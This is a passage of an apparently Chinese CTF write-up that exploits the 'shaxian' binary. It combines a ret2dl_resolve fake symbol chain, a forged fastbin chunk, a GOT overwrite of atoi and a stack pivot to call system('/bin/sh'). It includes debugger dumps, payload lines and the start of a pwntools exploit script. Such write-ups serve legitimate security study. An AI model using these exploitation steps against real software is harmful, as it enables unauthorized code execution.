(*local*)      25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)   0 (*local*)    </span><br><span class="line">  008:  26 (GLIBC_2.3)    25 (GLIBC_PRIVATE)   7 (GLIBC_2.2)     4 (GLIBC_2.1.1)</span><br><span class="line">  00c:  11 (GLIBC_2.4)     4 (GLIBC_2.1.1)   2 (GLIBC_2.0)     3 (GLIBC_2.1)  </span><br><span class="line">  010:   4 (GLIBC_2.1.1)   e (GLIBC_2.3.2)   2 (GLIBC_2.0)    11 (GLIBC_2.4)  </span><br><span class="line">  014:   2 (GLIBC_2.0)     3 (GLIBC_2.1)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">Version definition section &apos;.gnu.version_d&apos; contains 35 entries:</span><br><span class="line">  Addr: 0x000000000001473c  Offset: 0x01473c  Link: 5 (.dynstr)  </span><br><span class="line">  000000: Rev: 1  Flags: BASE   Index: 1  Cnt: 1  Name: libc.so.6</span><br><span class="line">  0x001c: Rev: 1  Flags: none  Index: 2  Cnt: 1  Name: GLIBC_2.0</span><br><span class="line">  0x0038: Rev: 1  Flags: none  Index: 3  Cnt: 2  Name: GLIBC_2.1</span><br><span class="line">  0x0054: Parent 1: GLIBC_2.0</span><br><span class="line">  0x005c: Rev: 1  Flags: none  Index: 4  Cnt: 2  Name: GLIBC_2.1.1</span><br><span class="line">  0x0078: Parent 1: GLIBC_2.1</span><br><span class="line">........</span><br><span class="line">  0x0494: Rev: 1  Flags: none  Index: 34  Cnt: 2  Name: GLIBC_PRIVATE</span><br><span class="line">  0x04b0: Parent 1: GLIBC_2.23</span><br><span class="line">  0x04b8: Rev: 1  Flags: none  Index: 35  Cnt: 1  Name: GCC_3.0</span><br><span class="line">  Version definition past end of section</span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x0000000000014c10  Offset: 0x014c10  Link: 5 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: ld-linux.so.2  Cnt: 3</span><br><span class="line">  0x0010:   Name: GLIBC_2.3  Flags: none  Version: 38</span><br><span class="line">  0x0020:   Name: GLIBC_PRIVATE  Flags: none  Version: 37</span><br><span class="line">  0x0030:   Name: GLIBC_2.1  Flags: none  Version: 36</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>l-&gt;l_version</code>数组(link_map中的结构)应该是将<code>可执行文件</code>的符号版本信息放在前，<code>libc.so</code>的符号版本信息放在后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup()：</span><br><span class="line">0xf7fe785b    add    edx, dword ptr [edi + 0x170] ; edx = l_version[ndx]</span><br><span class="line">► 0xf7fe7861    mov    ecx, dword ptr [edx + 4] ; ecx = 0x0D696910,version-&gt;hash</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7ffd918+0x170</span><br><span class="line">00:0000│   0xf7ffda88 —▸ 0xf7fd3480 ◂— 0x0</span><br><span class="line">01:0004│   0xf7ffda8c ◂— 0x4</span><br><span class="line">02:0008│   0xf7ffda90 ◂— 0x3</span><br><span class="line">03:000c│   0xf7ffda94 ◂— 0x0</span><br><span class="line">04:0010│   0xf7ffda98 ◂— 0x5</span><br><span class="line">05:0014│   0xf7ffda9c —▸ 0x80481bc ◂— sub    byte ptr [ebx], 2</span><br><span class="line">06:0018│   0xf7ffdaa0 —▸ 0x80481c0 ◂— or     eax, 0xe000000 /* &apos;\r&apos; */</span><br><span class="line">07:001c│   0xf7ffdaa4 —▸ 0x8048198 ◂— test   dl, al</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7fd3480 300</span><br><span class="line">00:0000│ edx  0xf7fd3480 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0020│      0xf7fd34a0 —▸ 0x804838c ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">09:0024│      0xf7fd34a4 ◂— 0xd696910</span><br><span class="line">0a:0028│      0xf7fd34a8 ◂— 0x0</span><br><span class="line">0b:002c│      0xf7fd34ac —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">0c:0030│      0xf7fd34b0 —▸ 0x8048382 ◂— inc    edi /* &apos;GLIBC_2.4&apos; */</span><br><span class="line">0d:0034│      0xf7fd34b4 ◂— 0xd696914</span><br><span class="line">0e:0038│      0xf7fd34b8 ◂— 0x0</span><br><span class="line">0f:003c│      0xf7fd34bc —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">10:0040│      0xf7fd34c0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">18:0060│      0xf7fd34e0 —▸ 0xf7fd7241 ◂— dec    esp /* &apos;LINUX_2.6&apos; */</span><br><span class="line">19:0064│      0xf7fd34e4 ◂— 0x3ae75f6</span><br><span class="line">1a:0068│      0xf7fd34e8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1c:0070│      0xf7fd34f0 —▸ 0xf7fd724b ◂— dec    esp /* &apos;LINUX_2.5&apos; */</span><br><span class="line">1d:0074│      0xf7fd34f4 ◂— 0x3ae75f5</span><br><span class="line">1e:0078│      0xf7fd34f8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">28:00a0│      0xf7fd3520 —▸ 0xf7e0d2e5 ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">29:00a4│      0xf7fd3524 ◂— 0xd696910</span><br><span class="line">2a:00a8│      0xf7fd3528 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2c:00b0│      0xf7fd3530 —▸ 0xf7e0d2ef ◂— inc    edi /* &apos;GLIBC_2.1&apos; */</span><br><span class="line">2d:00b4│      0xf7fd3534 ◂— 0xd696911</span><br><span class="line">2e:00b8│      0xf7fd3538 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">30:00c0│      0xf7fd3540 —▸ 0xf7e0d2f9 ◂— inc    edi /* &apos;GLIBC_2.1.1&apos; */</span><br><span class="line">31:00c4│      0xf7fd3544 ◂— 0x9691f71</span><br><span class="line">32:00c8│      0xf7fd3548 ◂— 0x0</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p><h4 id="0x31-内存的布局"><a href="#0x31-内存的布局" class="headerlink" title="0x31 内存的布局"></a>0x31 内存的布局</h4><p>1、<code>shellcode</code>之前应该<code>预留的</code>栈空间大小</p><p>&emsp;&emsp;这里的shellcode指的是如下形式的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = p32(PLT0) + p32(reloc_offset) + p32(0x01010101) + p32(binsh_str_addr)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段shellcode的功能是使程序的控制流跳转到<code>PLT0</code>，执行符号地址解析函数<code>_dl_runtime_resolve()</code>。<code>第一个双字</code>是PLT0的地址，<code>第二个双字</code>是符号的重定位项在重定位表中的偏移，<code>第三个双字</code>是所解析函数的返回地址，<code>第四个双字</code>是所解析函数的参数。</p><p>&emsp;&emsp;由于此程序开启了<code>Partial RELRO</code>(部分重定位只读)，所以<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。程序控制流跳转到shellcode后，<code>栈</code>也跟着<code>转移</code>过来了。符号解析函数在<code>解析符号地址</code>的过程中会<code>读写</code>shellcode之前的地址上的数据。由于只有.got.plt段以后才可写，所以我们的<code>shellcode</code>应该距离<code>.got.plt段起始地址</code>有一段距离。经过测试，这个距离至少为<code>0x300字节</code>。这个值或许与<code>glibc</code>的版本有关，但影响应该不大。所以，我们的shellcode应至少在Title的缓冲区中或之后。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x804a000 r-xp     2000 0      /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804a000  0x804b000 r--p     1000 1000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804b000  0x804c000 rw-p     1000 2000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804c000  0x806d000 rw-p    21000 0      [heap]</span><br><span class="line">0xf7df9000 0xf7dfa000 rw-p     1000 0      </span><br><span class="line">0xf7dfa000 0xf7faa000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7faa000 0xf7fab000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fab000 0xf7fad000 r--p     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fad000 0xf7fae000 rw-p     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fae000 0xf7fb1000 rw-p     3000 0      </span><br><span class="line">0xf7fd3000 0xf7fd4000 rw-p     1000 0      </span><br><span class="line">0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rw-p    21000 0      [stack]</span><br><span class="line"></span><br><span class="line">1、.got.plt段的起始地址为0x804b000。</span><br><span class="line">2、此程序中现有的缓冲区：</span><br><span class="line">    # 0x0804B0C0 - 0x0804B1C0 (0x100)</span><br><span class="line">    Phone_number_buf = 0x0804B0C0</span><br><span class="line">    # 0x0804B1C0 - 0x0804B1E0 (0x20)</span><br><span class="line">    head_ptr = 0x0804B1C0</span><br><span class="line">    # 0x0804B1E0 - 0x0804B2E0 (0x100)</span><br><span class="line">    Address_buf = 0x0804B1E0</span><br><span class="line">    # 0x0804B2E0 - 0x0804B300 (0x20)</span><br><span class="line">    shopping_cart = 0x0804B2E0</span><br><span class="line">    # 0x0804B300 - 0x0804B400 (0x100)</span><br><span class="line">    Title = 0x0804B300</span><br></pre></td></tr></table></figure></p><p>2、<code>shellcode</code>与<code>fake_chain</code>的位置关系</p><p>&emsp;&emsp;<code>shellcode</code>一般在<code>fake_chain</code>的前面，这样就不会出现符号解析函数解析过程中将fake_chain数据<code>覆盖</code>的情况。就算一定要放在后面，也要与fake_chain有一个<code>安全距离</code>。</p><p>3、<code>ndx</code>的取值</p><p>&emsp;&emsp;<code>ndx值</code>一般设为<code>0</code>即可，设为别的值也可，不过要满足一定的条件。如果将fake_chain放入<code>phone_number</code>、<code>address</code>、<code>title</code>等缓冲区中，计算是否存在可用的ndx值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">计算方法：</span><br><span class="line">sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span><br><span class="line">versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">计算内存布局(大概计算，未对齐)</span><br><span class="line">Phone_number_buf  0x0804B0C0 - 0x0804B1C0</span><br><span class="line">sym_index  0x2EE - 0x2FE</span><br><span class="line">versym_data_addr  0x08048972 - 0x08048992(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Address_buf  0x0804B1E0 - 0x0804B2E0</span><br><span class="line">sym_index  0x300 - 0x310</span><br><span class="line">versym_data_addr  0x08048996 - 0x080489B6(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Title  0x0804B300 - 0x0804B400</span><br><span class="line">sym_index  0x312 - 0x322</span><br><span class="line">versym_data_addr  0x080489BA - 0x080489DA(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">l_version = 0xf7fd3480</span><br><span class="line">r_found_version *version = l-&gt;l_version[ndx] = l-&gt;l_version + ndx*0x10</span><br><span class="line"></span><br><span class="line">1、0xf7fd3000 0xf7fd4000 rw-p     1000 0 (libc-2.23.so数据段); 0 &lt;= ndx &lt;= 0xB7(只有一个合适的)</span><br><span class="line">0x080489A2    ndx = 0x8B &lt; 0xB7(hash = 0)</span><br><span class="line">sym_index = 0x306</span><br><span class="line">(因为fake_chain在Address_buf,shellcode没法放在它的前面,要留够一定栈空间,执行后面的解析函数地址程序,放在后面,解析函数地址过程中,会覆盖fake_chain,如果之间的距离大于等于0x300,则应该可以)</span><br><span class="line"></span><br><span class="line">2、0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar] ; 0xB8 &lt; ndx &lt; 0x3B8 (此段虽然可读，但是成功率比较低，也无法查看其中的数据)</span><br><span class="line">0x0804897E    ndx = 0x1C0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x2F4(未成功,收到SIGBUS, Bus error信号)</span><br><span class="line">0x08048A00    ndx = 0xF0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x335(成功,这个fake_chain不在现有缓冲区中,在Title后面的fake_chunk中)</span><br><span class="line"></span><br><span class="line">3、0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so；0x28B8 &lt; ndx &lt; 0x29B8(只有一个合适的)</span><br><span class="line">0xf7ffc210 - 0xf7fd3480 = 0x28D90</span><br><span class="line">0x080489C4    ndx = 0x28EC &lt; 0x29B8</span><br><span class="line">sym_index = 0x317(成功)</span><br><span class="line"></span><br><span class="line">4、0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so; 0x29B8 &lt; ndx &lt; 0x2AB8(未找到合适的)</span><br><span class="line"></span><br><span class="line">如果将fake_chain放入Title缓冲区后面构造的fake_chunk中，需要满足以下条件：</span><br><span class="line">- 1、由上可知，fake_chain要放在Title之后，sym_index至少为0x322,但是fake_sym数据的地址不能超过0x804C000,所以sym_index至多为0x3E2。</span><br><span class="line">- 2、versym_data在0x080489DA之后，但不能超过0x08048B5A。在这期间找是否有符合以上ndx范围的ndx值。</span><br></pre></td></tr></table></figure></p><p>4、<code>version-&gt;Hash</code>的取值</p><p>&emsp;&emsp;<code>ndx值</code>如果<code>未使</code>l_version数组访问越界，则对<code>version-&gt;hash</code>的值无要求。<code>ndx值</code>如果<code>使</code>l_version数组访问越界，则要使<code>version-&gt;hash</code>的值为0。</p><h4 id="0x32-本方法使用的内存布局"><a href="#0x32-本方法使用的内存布局" class="headerlink" title="0x32 本方法使用的内存布局"></a>0x32 本方法使用的内存布局</h4><p>&emsp;&emsp;fake_chunk的地址应该<code>8字节对齐</code>，而<code>sym_data地址</code>与<code>符号表(.dynsym)</code>起始地址的差值应该是<code>0x10</code>的整数倍，fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[fake_chunk] for [fake_chain]</span><br><span class="line">0x0804BF08 - 0x0804BF10  chunk_header</span><br><span class="line">0x0804BF10 - 0x0804BF14  count</span><br><span class="line">0x0804BF14 - 0x0804BF34  food_type</span><br><span class="line">0x0804BF34 - 0x0804BF38  next</span><br><span class="line"></span><br><span class="line">[fake_chain]</span><br><span class="line">0x0804BF14 - 0x0804BF1C  reloc_data</span><br><span class="line">0x0804BF1C - 0x0804BF2C  sym_data</span><br><span class="line">0x0804BF2C - 0x0804BF34  &quot;system&quot;</span><br><span class="line">0x0804BF34 - 0x0804BF3C  &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;还有一个处于<code>head_ptr附近</code>的用于<code>任意地址</code>写入4字节<code>任意数据</code>的fake_chunk，此fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0804B0C0 - 0x0804B1C0  Phone_number </span><br><span class="line"></span><br><span class="line">[fake_chunk] for head_ptr</span><br><span class="line">0x0804B1B0 - 0x0804B1B8  chunk_header</span><br><span class="line">0x0804B1B8 - 0x0804B1BC  count</span><br><span class="line">0x0804B1BC - 0x0804B1C0------------</span><br><span class="line">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span><br><span class="line">0x0804B1C4 - 0x0804B1DC------------</span><br><span class="line">0x0804B1DC - 0x0804B1E0  next</span><br><span class="line"></span><br><span class="line">0x0804B1E0 - 0x0804B1E8  Address(next_chunk&apos;s chunk_header)</span><br><span class="line">0x0804B1E8 - 0x0804B2E0  Address</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们将<code>shellcode</code>放在了Title缓冲区的<code>末尾</code>，在fake_chain的<code>前面</code>，保证了预留的栈空间大于<code>0x300字节</code>。至此，内存布局完成。</p><h4 id="0x33-利用思路"><a href="#0x33-利用思路" class="headerlink" title="0x33 利用思路"></a>0x33 利用思路</h4><p>1、<strong><code>Stage1</code></strong>：为fake_chain创建fake_chunk</p><p>&emsp;&emsp;为<code>fake_chain</code>创建<code>fake_chunk</code>其实就是伪造fake_chunk的chunk_header和fake_chunk的next_chunk的chunk_header。因为需要<code>Free</code>的<code>chunk</code>是需要满足一定条件的：</p><blockquote><p>1、fake_chunk 的<code>ISMMAP</code>位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>2、fake_chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code>。<br>3、fake_chunk 的<code>size大小</code>需要满足对应的fastbin的需求，同时也得<code>对齐</code>。<br>4、fake_chunk的<code>next chunk的大小</code>不能小于2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>5、fake_chunk对应的<code>fastbin链表头部</code>不能是该fake_chunk，即不能构成<code>double free</code>的情况。</p></blockquote><p>2、<strong><code>Stage2</code></strong>：将fake_chain写入fake_chunk</p><p>&emsp;&emsp;首先将<code>fake_chunk</code>释放，让其进入<code>fastbin链表</code>中，<code>fastbin链表的头指针</code>指向这个fake_chunk，下次通过<code>malloc</code>申请chunk时，就会从fastbin链表的头部取下这个fake_chunk，我们就可以将<code>fake_chain</code>写入到此<code>fake_chunk</code>。</p><p>3、<strong><code>Stage3</code></strong>：将shellcode写入Title缓冲区末尾</p><p>&emsp;&emsp;shellcode用于<code>调用符号解析函数</code>，解析system的地址。</p><p>4、<strong><code>Stage4</code></strong>：将atoi_got修改为gadgets的地址</p><p>&emsp;&emsp;gadgets的作用是<code>抬高栈</code>，因为<code>调用atoi()函数</code>的时候，<code>esp</code>距离<code>payload</code>还有一段内存，所以需要将栈抬高。还将<code>ebp</code>修改为<code>shellcode的地址</code>，再通过<code>leave;ret</code>跳转到shellcode执行。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">08048C29  <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">1Ch</span></span><br><span class="line">08048C2C  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">08048C2D  <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line">08048C2E  <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">08048C2F  <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">08048C30  <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>5、<strong><code>Stage5</code></strong>：输入atoi的参数,并跳转到shellcode执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp,跳转到shellcode执行)</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure></p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 